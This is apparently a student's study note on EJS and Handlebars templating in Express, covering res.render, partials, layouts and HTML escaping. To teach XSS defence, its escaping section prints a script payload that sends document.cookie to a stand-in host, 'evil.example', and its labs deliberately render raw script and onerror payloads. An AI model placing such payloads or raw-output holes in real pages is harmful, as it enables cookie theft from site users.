# Template Engines — Handlebars, EJS & the Layout Mechanism

**Created Date:** 2026-10-10
**Last Updated:** 2026-10-10
**Tags:** `#TemplateEngine`, `#EJS`, `#Handlebars`, `#Layout`, `#SSR`, `#Express`, `#XSS`, `#Partials`, `#DevTools`
**References:** EJS docs (github.com/mde/ejs) · Handlebars.js docs (handlebarsjs.com) · express-handlebars docs (github.com/express-handlebars/express-handlebars) · Express.js "Using template engines" guide · OWASP XSS Prevention Cheat Sheet
**Status:** Draft
**Difficulty:** Intermediate
**Prerequisites:** [`./01-static-dynamic-ssr-vs-csr.md`](./01-static-dynamic-ssr-vs-csr.md) (the SSR flow this note implements), [`./03-mvc-architecture-in-express.md`](./03-mvc-architecture-in-express.md) (the "V" this note fills), [`../web_basics/04-javascript-language-core.md`](../web_basics/04-javascript-language-core.md) (JS inside EJS is still JS)

---

## 📌 Key Takeaways (TL;DR)
- A **template engine turns `data + template` into an HTML string on the server.** The template is *code embedded in markup*; the engine compiles it and `res.send`s the result — that is SSR (bridge `01`).
- Templating is the **V of MVC** (bridge `03`): the controller hands a plain data object to `res.render`, and the view knows nothing about SQL, sessions, or routing.
- **Escaping is automatic and is your first XSS defense.** `<%= %>` (EJS) and `{{ }}` (Handlebars) HTML-escape by default; the *raw* variants `<%- %>` and `{{{ }}}` do not — they are the dangerous ones (bridge `security/01`).
- **A layout is the DRY mechanism.** `layout.handlebars` wraps every page via `{{{body}}}` so the header, footer, and nav live in **one** file instead of every template.
- **Pick one engine per app.** EJS = "JavaScript in HTML" (you already know JS); Handlebars = "logic-averse mustache" (safer defaults, custom helpers). The course expects you to know both.

---

## 🧠 Detailed Notes

### 1. Core Concepts (Mental Model)

A template engine is a **pure function on the server**:

```
   render(template, data)  ──►  HTML string
   ───────────────────────      ───────────
   <h1>Hello {{name}}</h1>      <h1>Hello Alex</h1>
   { name: "Alex" }
```

The template is **not** a web page you edit in the browser. It is source code, parsed and compiled by Node, with hooks (`{{name}}`, `<%= name %>`) where data gets injected, then executed to produce a string. That string is what the browser receives — the browser never sees the template, only the finished HTML.

**Where this fits:** this is the implementation of the SSR flow from [`./01-static-dynamic-ssr-vs-csr.md`](./01-static-dynamic-ssr-vs-csr.md). SSR said *"the server produces complete HTML per request"*; **this note is the machine that produces it.** It is also exactly the **V** in MVC ([`./03-mvc-architecture-in-express.md`](./03-mvc-architecture-in-express.md)): the controller fetches data, the model is the data layer, and the view (template) formats it into markup. The view should contain **presentation logic only** — loops and conditionals for display, never a database query.

**Why not just build strings in JavaScript?** Because you can:

```js
// ❌ works, then rots
res.send(`<h1>${post.title}</h1><ul>${posts.map(p => `<li>${p.title}</li>`).join("")}</ul>`);
```

This is fine for two lines and a disaster at two hundred: no escaping (that `${post.title}` is an XSS hole), no separation of concerns, no reuse. A template engine gives you **automatic escaping**, **partials** (reusable chunks), and **a file per screen**.

**The one rule that prevents most template bugs:** the template is **data in, markup out**. If a template contains `await db.query(...)`, a session lookup, or a redirect decision, that logic belongs in the controller — not the view.

---

### 2. How SSR Templating Flows — `res.render` end to end

Express exposes one method: `res.render(view, locals)`. `view` is a filename, `locals` is the data object. Here is the full path from click to bytes:

```
Browser            Express controller              Engine            DB (Knex)
   │                       │                          │                  │
   │ GET /posts            │                          │                  │
   ├──────────────────────►│                          │                  │
   │                       │ await knex('posts')      │                  │
   │                       ├─────────────────────────────────────────────►│
   │                       │◄─────────────────────────────────────────────┤
   │                       │ rows = [{id,title,body}, …]                 │
   │                       │                          │                  │
   │                       │ res.render("posts", {posts, user})          │
   │                       ├─────────────────────────►│                  │
   │                       │        compile template  │                  │
   │                       │        + merge locals    │                  │
   │                       │◄─────────────────────────┤                  │
   │                       │ HTML string              │                  │
   │                       │   "<!doctype html><html>…"                  │
   │ 200 OK + HTML         │                          │                  │
   │◄──────────────────────┤ (res.send under the hood)                   │
   │  browser parses & Paints                         │                  │
```

The controller (which is the **C** in MVC) does the data work and hands a **plain object** to the view:

```js
// controllers/postsController.js — the "C"
const knex = require("../db"); // the Knex query builder (bridge databases/06)

exports.index = async (req, res) => {
  const posts = await knex("posts").select("*").orderBy("created_at", "desc");
  res.render("posts/index", {
    posts,
    user: req.session.user,   // see web_server/06
    title: "All posts",
  });
};
```

Rules that fall out of this flow:
- **`locals` keys become template variables.** `{ posts }` → the template can read `posts`. Nothing else is in scope (except globals you deliberately configure).
- **`res.render` is the last step.** After it sends HTML, you do not also `res.send` or `res.json`.
- **The engine caches compiled templates in production** keyed by `NODE_ENV`. In dev you want it to re-read files on every request; see Pitfalls.

---

### 3. EJS — JavaScript, in HTML

EJS = *Embedded JavaScript*. It embeds real JS between **delimiters**, so if you can write JS, you can write EJS. Configure it in two lines:

```js
const express = require("express");
const path = require("path");
const app = express();

app.set("view engine", "ejs");                        // default extension
app.set("views", path.join(__dirname, "views"));      // where templates live
```

**The three delimiters — memorise which one outputs and which escapes:**

| Tag | Meaning | Outputs? | Escapes? |
|---|---|---|---|
| `<% code %>` | run JS, produce **no output** | ❌ | — |
| `<%= expr %>` | output the value | ✅ | ✅ **automatically** |
| `<%- expr %>` | output the value **raw** | ✅ | ❌ **danger** |
| `<%# comment %>` | comment, stripped from output | ❌ | — |

```ejs
<!-- views/posts/index.ejs -->
<h1><%= title %></h1>

<% if (user) { %>
  <p>Welcome back, <%= user.name %>.</p>
<% } else { %>
  <p>Please <a href="/login">log in</a>.</p>
<% } %>

<ul>
  <% posts.forEach(function (post) { %>
    <li>
      <a href="/posts/<%= post.id %>"><%= post.title %></a>
    </li>
  <% }); %>
</ul>
```

- `<% if (…) { %>` and `<% } %>` wrap markup: the condition is JS, the markup between is plain HTML.
- `<% posts.forEach(…) %>` **is a loop** — the same `forEach` you already know from [`../web_basics/04-javascript-language-core.md`](../web_basics/04-javascript-language-core.md). The template does not invent a new loop syntax.
- `post.title` goes through `<%= %>` → HTML-escaped. `<%- post.body %>` would inject it raw.

**Passing locals** — whatever the controller passes is directly in scope: `res.render("posts/index", { posts, title: "All posts" })` makes `posts` and `title` available as bare names (no `locals.` prefix).

**Partials (EJS `include`)** — reusable fragments. An include is just another `.ejs` file pulled in at render time:

```ejs
<!-- views/partials/header.ejs -->
<header class="site-header">
  <a href="/" class="logo">MyBlog</a>
  <nav><a href="/posts">Posts</a> <a href="/login">Login</a></nav>
</header>
```

```ejs
<!-- views/posts/index.ejs -->
<%- include('partials/header') %>   <!-- note the RAW tag! -->
<main>
  <h1><%= title %></h1>
</main>
```

Includes use `<%- %>` (raw) because the included file already **is** HTML — you want it inserted as markup, not escaped into visible tags. EJS resolves the path relative to the current file (or `views`), and the partial inherits the current locals plus anything you pass:

```ejs
<%- include('partials/card', { post, showDate: true }) %>
```

**Why EJS is the easy one:** its "logic" is literally the JavaScript you already write. Its danger is the same: it is *easy* to reach for `<%- %>` and open an XSS hole. EJS will not save you from that — §6 covers exactly when raw is acceptable.

---

### 4. Handlebars — logic-averse, but with helpers

Handlebars takes the opposite philosophy: **the template should not contain arbitrary JavaScript**. It offers a small set of built-in block helpers (`each`, `if`, `unless`, `with`), and everything else is a **custom helper** you register in JavaScript. Configure it with `express-handlebars`:

```js
const express = require("express");
const path = require("path");
const { engine } = require("express-handlebars");     // v6+/v7
const app = express();

app.engine("handlebars", engine({
  layoutsDir: path.join(__dirname, "views/layouts"),    // where layout.handlebars lives
  defaultLayout: "main",                                // views/layouts/main.handlebars
  partialsDir: path.join(__dirname, "views/partials"),  // {{> header }} resolves here
  helpers: {
    // a custom helper — runs on the server, returns a string
    formatDate(date) {
      return new Date(date).toISOString().slice(0, 10);
    },
    uppercase(s) { return String(s).toUpperCase(); },
  },
}));
app.set("view engine", "handlebars");
app.set("views", path.join(__dirname, "views"));
```

**The expressions — same escaped/raw split as EJS, different syntax:**

| Syntax | Meaning | Escapes? |
|---|---|---|
| `{{ expr }}` | output (HTML-escaped) | ✅ |
| `{{{ expr }}}` | output **raw** (triple-stache) | ❌ **danger** |
| `{{#if cond}} … {{else}} … {{/if}}` | conditional block | — |
| `{{#unless cond}} … {{/unless}}` | inverse conditional | — |
| `{{#each list}} … {{/each}}` | iterate; `{{this}}` is the item | — |
| `{{> partialName }}` | insert a partial | — |
| `{{helperName arg}}` | call a registered helper | as returned |

```handlebars
{{! views/posts/index.handlebars — a comment }}
<h1>{{title}}</h1>

{{#if user}}
  <p>Welcome back, {{user.name}}.</p>
{{else}}
  <p>Please <a href="/login">log in</a>.</p>
{{/if}}

<ul>
  {{#each posts}}
    <li>
      <a href="/posts/{{id}}">{{title}}</a>
      <small>published {{formatDate createdAt}}</small>
    </li>
  {{/each}}
</ul>
```

- `{{title}}` escapes automatically. `{{{post.body}}}` would inject raw HTML — reserved for trusted, sanitized content only.
- `{{#each posts}}` iterates; inside the block, `{{this}}` is the current item and `{{id}}` reads its property. `{{@index}}` is the position.
- `{{formatDate createdAt}}` calls the helper you registered. **This is the key difference from EJS:** the logic lives in a registered JS function, not inline in the template.

**Partials** (`{{> navbar }}`) are `views/partials/navbar.handlebars`, inserted at that point:

```handlebars
{{> navbar }}
<main>{{{body}}}</main>
```

**Why Handlebars is "safer by taste":** a designer can edit a Handlebars template without writing loops or conditionals in a full language; unescaped output requires the deliberate triple-stache; and business formatting (`formatDate`, currency, i18n) is centralized in helpers instead of copy-pasted.

---

### 5. The Layout Mechanism & DRY

Without a layout, every page repeats `<html>`, `<head>`, the nav, and the footer. Change the nav and you touch ten files. The **layout** solves this: it is a wrapper template that renders *around* the page.

In `express-handlebars`, the mechanism is `{{{body}}}` — the engine renders your view first, then injects that HTML where `{{{body}}}` sits in the layout:

```
   TWO-STEP RENDER
   ───────────────
   render("posts/index", locals)
        │
        │  step 1: render the VIEW  → "<h1>All posts</h1> …"
        ▼
   inject into layout at {{{body}}}
        │
        │  step 2: render the LAYOUT → complete page
        ▼
   "<!doctype html><html>… <head>… <body> <header>… {{{body}}} … <footer> </body>"
        │
        ▼
   res.send(complete HTML)
```

`{{{body}}}` **must be triple-stache** — the view already contains HTML, so escaping it would print the tags as visible text. Same reason EJS's `include` uses `<%- %>`:

```handlebars
{{! views/layouts/main.handlebars — the ONE file with <html>: every page gets it }}
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>{{title}} · MyBlog</title>
  <!-- Bootstrap/Tailwind CDN goes HERE once, for every page (bridge web_basics/07) -->
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
  {{> navbar }}
  <main class="container py-4">
    {{{body}}}          <!-- ← the page view is injected here -->
  </main>
  <footer class="text-center py-4">© 2026 MyBlog</footer>
</body>
</html>
```

> **Version note:** the *mechanism* is always "layout wraps the view". Older `express-handlebars` and `hbs` variants sometimes expressed the injection point as `{{> body }}` (a partial named `body`) or supported a `layout` local to choose a layout per render. The modern (`express-handlebars` v6/v7) convention is `{{{body}}}`. When a tutorial disagrees, check its engine version — the concept is identical, only the token differs.

**Multiple layouts.** `defaultLayout: "main"` is only the fallback. A public page and an admin panel want different chrome, so you keep two layouts and choose per render:

```handlebars
{{! views/layouts/admin.handlebars — sidebar layout }}
<!doctype html><html><head>…</head>
<body>
  <aside class="sidebar">{{> admin_nav }}</aside>
  <main>{{{body}}}</main>
</body></html>
```

```js
// choose the layout per response
res.render("admin/dashboard", { layout: "admin", stats });
```

**Why layouts matter (DRY):** one edit to `main.handlebars` changes the header/footer/CDN for the entire site. It also makes the **two-step model** explicit — *view = page content*, *layout = site chrome*. The controller never thinks about `<head>`.

---

### 6. Escaping & XSS — the one section you must not skim

Both engines HTML-escape by default. Here is the same user string through both paths. Suppose a comment body arrives as:

```js
const userComment = '<script>fetch("//evil.example/?c="+document.cookie)</script>';
```

EJS:

```ejs
<p>Escaped: <%= userComment %></p>   <!-- SAFE -->
<p>Raw:     <%- userComment %></p>   <!-- XSS HOLE -->
```

Handlebars:

```handlebars
<p>Escaped: {{userComment}}</p>   <!-- SAFE -->
<p>Raw:     {{{userComment}}}</p> <!-- XSS HOLE -->
```

The **escaped** path produces text the browser displays literally — the `<script>` becomes `&lt;script&gt;` and never runs:

```html
<p>Escaped: &lt;script&gt;fetch("//evil.example/?c="+document.cookie)&lt;/script&gt;</p>
```

The **raw** path produces live markup — the browser parses it, runs the script, and exfiltrates the user's cookie:

```html
<p>Raw:     <script>fetch("//evil.example/?c="+document.cookie)</script></p>
```

**Why escaping is your first defense:** the mitigation is *structural*. As long as user data flows through `<%= %>` / `{{ }}`, no amount of `<`, `>`, `"`, `&`, or `'` in the input can break out of the HTML context. Raw output is an explicit opt-out of that guarantee.

**When is raw ever correct?** Almost never, and *never* on untrusted input. The legitimate case is displaying HTML produced by a **server-side sanitizer** — e.g. a WYSIWYG editor's output that you have already run through a library that strips dangerous tags/attributes. Even then the rule is *sanitize, then raw* (bridge [`../security/01-web-security-injection-xss-csrf-session-hijacking.md`](../security/01-web-security-injection-xss-csrf-session-hijacking.md) and the WYSIWYG section of [`./08-advanced-features-pagination-wysiwyg-upload.md`](./08-advanced-features-pagination-wysiwyg-upload.md)). "The user is an admin" is not sanitization. "I trust this field" is how breaches start.

| Path | Tag | If data is untrusted |
|---|---|---|
| EJS escaped | `<%= x %>` | ✅ safe default |
| EJS raw | `<%- x %>` | ❌ XSS |
| HBS escaped | `{{x}}` | ✅ safe default |
| HBS raw | `{{{x}}}` | ❌ XSS |
| Layout body | `{{{body}}}` | ✅ safe — the *view* is trusted, server-authored HTML |

---

## 🧾 Command / Code Cheat Sheet

| Command / Code | What it does | When to use | Example |
|---|---|---|---|
| `app.set("view engine", "ejs")` | register engine by extension | once at app setup | `res.render("home")` → `home.ejs` |
| `app.set("views", path.join(__dirname, "views"))` | where templates live | once at setup; fixes "view not found" | absolute path |
| `res.render(view, locals)` | render template → send HTML | every SSR response | `res.render("posts/index", { posts })` |
| `npm i ejs express-handlebars` | install engines | project setup | add to `package.json` |
| EJS `<% … %>` | run JS, no output | conditions, loops | `<% if (user) { %>` |
| EJS `<%= x %>` | escaped output | **all** user data | `<%= post.title %>` |
| EJS `<%- x %>` | raw output | includes / sanitized HTML only | `<%- include('partials/header') %>` |
| EJS `<%- include('p', {…}) %>` | insert partial + locals | reuse fragments | header, footer, card |
| HBS `{{x}}` / `{{{x}}}` | escaped / raw output | user data / trusted HTML | `{{title}}` |
| HBS `{{#each list}}` / `{{#if c}}` | loop / conditional block | list & branch rendering | `{{#each posts}}` |
| HBS `{{> partial}}` | insert partial | reusable fragment | `{{> navbar}}` |
| HBS `{{helper arg}}` | call registered helper | formatting (dates, money) | `{{formatDate createdAt}}` |
| `engine({ layoutsDir, defaultLayout, partialsDir, helpers })` | configure express-handlebars | app setup | `defaultLayout: "main"` |
| `res.render(view, { layout: "admin" })` | pick a non-default layout | admin vs public chrome | sidebar layout |
| `{{{body}}}` in layout | view injection point | every layout | wraps all pages |

---

## 🧪 Practical Lab

> Two fully runnable mini-apps. Create each in its own folder, run `node app.js`, and compare the browser output with the "expected" blocks.

### Lab A — EJS: list posts + a partial header

```bash
mkdir -p /tmp/ejs-lab/views/partials && cd /tmp/ejs-lab
npm init -y && npm i express ejs
```

File tree:

```
ejs-lab/
├── app.js
└── views/
    ├── partials/header.ejs
    └── posts.ejs
```

```js
// app.js
const express = require("express");
const path = require("path");
const app = express();

app.set("view engine", "ejs");
app.set("views", path.join(__dirname, "views"));

const posts = [
  { id: 1, title: "Hello SSR", body: "Rendered on the server." },
  { id: 2, title: "<script>alert(1)</script>", body: "This title is user data." },
];

app.get("/", (req, res) => res.render("posts", { title: "All posts", posts }));
app.listen(3000, () => console.log("http://localhost:3000"));
```

```ejs
<!-- views/partials/header.ejs -->
<header><h1>MyBlog</h1></header>
```

```ejs
<!-- views/posts.ejs -->
<!doctype html>
<html><head><title><%= title %></title></head>
<body>
  <%- include('partials/header') %>
  <ul>
    <% posts.forEach(function (p) { %>
      <li><a href="/posts/<%= p.id %>"><%= p.title %></a></li>
    <% }); %>
  </ul>
</body></html>
```

Run `node app.js` and open `http://localhost:3000`. **Expected HTML sent** (note the escaped script in post 2):

```html
<!doctype html>
<html><head><title>All posts</title></head>
<body>
  <header><h1>MyBlog</h1></header>
  <ul>
      <li><a href="/posts/1">Hello SSR</a></li>
      <li><a href="/posts/2">&lt;script&gt;alert(1)&lt;/script&gt;</a></li>
  </ul>
</body></html>
```

*What to notice:* the header partial was inserted as markup (via `<%- include %>`), and the malicious title was **escaped** by `<%= %>` — it renders as harmless text, not a running script.

### Lab B — Handlebars: defaultLayout + helper + escaped-vs-raw

```bash
mkdir -p /tmp/hbs-lab/views/{layouts,partials} && cd /tmp/hbs-lab
npm init -y && npm i express express-handlebars
```

File tree:

```
hbs-lab/
├── app.js
└── views/
    ├── layouts/main.handlebars
    ├── partials/navbar.handlebars
    └── page.handlebars
```

```js
// app.js
const express = require("express");
const path = require("path");
const { engine } = require("express-handlebars");
const app = express();

app.engine("handlebars", engine({
  layoutsDir: path.join(__dirname, "views/layouts"),
  defaultLayout: "main",
  partialsDir: path.join(__dirname, "views/partials"),
  helpers: { formatDate: (d) => new Date(d).toISOString().slice(0, 10) },
}));
app.set("view engine", "handlebars");
app.set("views", path.join(__dirname, "views"));

app.get("/", (req, res) => res.render("page", {
  title: "Home",
  createdAt: Date.now(),
  userComment: '<script>alert("xss")</script>',
}));
app.listen(3000, () => console.log("http://localhost:3000"));
```

```handlebars
{{! views/layouts/main.handlebars }}
<!doctype html>
<html><head><title>{{title}}</title></head>
<body>
  {{> navbar }}
  <main>{{{body}}}</main>
</body></html>
```

```handlebars
{{! views/partials/navbar.handlebars }}
<nav><a href="/">Home</a></nav>
```

```handlebars
{{! views/page.handlebars }}
<p>Rendered at {{formatDate createdAt}}</p>
<p>Escaped: {{userComment}}</p>
<p>Raw: {{{userComment}}}</p>
```

Run `node app.js` and open `http://localhost:3000`. **Expected HTML:**

```html
<!doctype html>
<html><head><title>Home</title></head>
<body>
  <nav><a href="/">Home</a></nav>
  <main>
    <p>Rendered at 2026-10-10</p>
    <p>Escaped: &lt;script&gt;alert("xss")&lt;/script&gt;</p>
    <p>Raw: <script>alert("xss")</script></p>
  </main>
</body></html>
```

*What to notice:* (1) the page never wrote `<html>`/`<head>`/`<nav>` — `{{{body}}}` and `{{> navbar }}` supplied them; (2) `{{formatDate}}` ran on the server; (3) the escaped line prints the script as text while the **raw** line runs it — open DevTools and the `alert` fires. That contrast *is* the security lesson.

---

## ⚠️ Common Pitfalls & Gotchas

| Pitfall | Symptom | Why | Fix |
|---|---|---|---|
| Mixing EJS and HBS in one app | `Error: No default engine` / templates ignored | `view engine` is a single setting | Pick one engine per app; if migrating, change both `app.engine` and `view engine` together |
| Forgetting the views dir | `Failed to lookup view "…" in views directory` | Express defaults to `./views`, and your files are elsewhere | `app.set("views", path.join(__dirname, "views"))` |
| Layout not found | `Error: ENOENT … layouts/main.handlebars` | `layoutsDir`/`defaultLayout` mismatch, or file not in `layouts/` | Match the config to the real path; file must be `layouts/main.handlebars` |
| `{{{ }}}` / `<%- %>` on untrusted data | Injected `<script>` executes; cookie theft | Raw output disables escaping | Use `{{ }}` / `<%= %>`; sanitize server-side before any raw output |
| Engine caches templates in dev | Edits need a server restart | Production caching keyed on `NODE_ENV` | Run dev with `NODE_ENV=development` (or `nodemon` restart) so templates re-read |
| `<% … %>` without `=` prints nothing | Value silently missing from the page | `<% %>` runs code but outputs nothing | Use `<%= %>` to print; `<% %>` only for control flow |
| Partial path wrong in EJS | `Could not find the include file` | path is relative to `views`/current file, not project root | Use `include('partials/header')`, matching the real tree |
| `{{{body}}}` written as `{{body}}` | The whole page shows as escaped HTML text | escaped tag prints the view's tags literally | Triple-stache the body: `{{{body}}}` |
| Logic creeping into the view | Queries/redirects inside templates | view is for presentation only | Move it to the controller (bridge `03`) |
| HBS helper not registered | `Missing helper: "formatDate"` | helper added to wrong engine instance | Register in the same `engine({ helpers })` used by `app.engine` |

---

## 🔗 Tech Cross-References
- **Security (XSS)** — escaping in templates is the *first* XSS defense; `<%- %>`/`{{{ }}}` opt out of it, and sanitization of WYSIWYG HTML is a server-side job. See [`../security/01-web-security-injection-xss-csrf-session-hijacking.md`](../security/01-web-security-injection-xss-csrf-session-hijacking.md).
- **Databases (Knex)** — the rows a controller hands to `res.render` come from the query builder; the template only formats them. See [`../databases/06-knex-query-builder-and-crud.md`](../databases/06-knex-query-builder-and-crud.md).
- **CSS frameworks (Bootstrap/Tailwind)** — the CDN link belongs in the layout `<head>` **once**, so every page inherits the styling. See [`../web_basics/07-css-frameworks-bootstrap-tailwindcss.md`](../web_basics/07-css-frameworks-bootstrap-tailwindcss.md).
- **Box model / layout flow** — the classes in the layout and views ultimately feed the browser's layout engine. See [`../web_basics/02-css-box-model-and-layout-flow.md`](../web_basics/02-css-box-model-and-layout-flow.md).

## 🧪 Practice Tasks
> No solutions. Build each, then ask the AI to review your rendered HTML and your file tree.

- [ ] **Task 1 — Escaping audit.** Build an EJS route that renders three fields: a username (escaped), a "bio" that is raw, and a "signed-in-as" label. Feed the username `<img src=x onerror=alert(1)>` and the bio `<b>bold</b>`. Capture the exact HTML with `curl -i` and explain, per field, what ran and what did not.
- [ ] **Task 2 — Shared layout in both engines.** Build the same 3-page site (home, about, contact) twice: once with EJS + `<%- include %>`, once with `express-handlebars` + `{{{body}}}`. The header/footer/nav must exist in exactly one file per version. Prove it by changing the nav in one place and re-checking all three pages.
- [ ] **Task 3 — Custom helper.** In Handlebars, register helpers `truncate(text, n)` and `currency(amount)`; use them in a "orders" page that lists `{{#each orders}}`. Compare with the EJS equivalent, where the same logic lives inline. Write two sentences on which you preferred and why.
- [ ] **Task 4 (harder) — Layout per role.** Add an `admin` layout (sidebar) alongside `main`. Route `/admin` renders a dashboard with `layout: "admin"`; make header/nav differ between the two. Then explain what would break if you put `<html>` in *both* the layout and the view.

## 📝 Research Journey
- **Why:** MVC (note `03`) told me the view should format data, but `res.render(...)` was still a black box — I could not picture where `{ posts }` became HTML, and every tutorial showed a *different* engine with *different* delimiters. I wanted one mental model that covered EJS and Handlebars at once, because the course expects both.
- **Struggle:** The raw tags confused me the longest. `<%= %>` vs `<%- %>` and `{{ }}` vs `{{{ }}}` looked like noise until I realised they encode a single decision: *escape or not?* Once I saw `{{{body}}}` in a layout and understood the view's HTML must not be escaped, all four tags clicked into place. The layout itself was the second hurdle — "two-step render" sounded abstract until I watched the view render *first*, then get injected.
- **Aha moment:** The escaped-vs-raw lab where the same `<script>` string showed as text in one paragraph and popped an `alert` in the next. That one page made every escaping rule in this note obvious, and permanently cured me of reaching for raw output "because it looks nicer".
- **Career link:** As an AI Engineer in Economics/Business, the "product" is almost always a dashboard or report that formats model output for a human. That formatting layer *is* a view — and if I pipe model or user text through a raw tag, I have shipped an XSS hole. Knowing the escaping default and the layout mechanism is what lets me build a report UI once and reuse it everywhere, safely.

## 🔗 Related Topics
- [`./03-mvc-architecture-in-express.md`](./03-mvc-architecture-in-express.md) — the C/M/V split whose "V" this note implements.
- [`./04-routing-in-express.md`](./04-routing-in-express.md) — the routes that call `res.render`.
- [`./07-authentication-signup-signin-signout.md`](./07-authentication-signup-signin-signout.md) — the views for login/signup forms rendered by this engine.
- [`./01-static-dynamic-ssr-vs-csr.md`](./01-static-dynamic-ssr-vs-csr.md) — why the server renders at all.
- [`../security/01-web-security-injection-xss-csrf-session-hijacking.md`](../security/01-web-security-injection-xss-csrf-session-hijacking.md) — the full XSS/CSRF defense.
- [`../databases/06-knex-query-builder-and-crud.md`](../databases/06-knex-query-builder-and-crud.md) — the data handed to the template.
- [`../web_basics/02-css-box-model-and-layout-flow.md`](../web_basics/02-css-box-model-and-layout-flow.md) — styling that the layout's markup feeds.
- [SUGGESTED] `bridge-template-engines-to-react-jsx.md` — bridge note: `{{#each}}`/`<% forEach %>` vs JSX `.map()`, connecting this SSR engine to the Next.js/Joblink frontend.
- [SUGGESTED] `flash-messages-and-form-validation-ux.md` — how rendered views carry "wrong password" errors back to a form (already in the folder backlog).

## 🤔 Open Questions
- [ ] When a "view" is shared by both a browser and a bot, is server-rendered HTML ever *worse* than returning JSON plus a client renderer — and how do I measure the crossover?
- [ ] At what point does inline EJS logic become a maintenance problem that argues for Handlebars helpers (or a component library)?
- [ ] How do I sanitize WYSIWYG HTML server-side so that a single trusted `{{{ }}}` field is genuinely safe?
- [ ] Does `express-handlebars` template caching interact badly with hot-reload tooling in development, and what is the cleanest dev/prod switch?

---
*The template is code. The view formats data; the layout removes repetition; the escape tag is the lock on the front door.*

## ✅ Depth Checklist (Template G)
- [x] Mental model before commands
- [x] Command/Code cheat sheet ≥ 8 rows, each with "when to use"
- [x] ≥ 1 Practical Lab with expected output (two, runnable)
- [x] Common Pitfalls & Gotchas
- [x] 🔗 Tech Cross-References (2–4 other technologies)
- [x] 🧪 Practice Tasks without solutions
- [x] Research Journey + career link
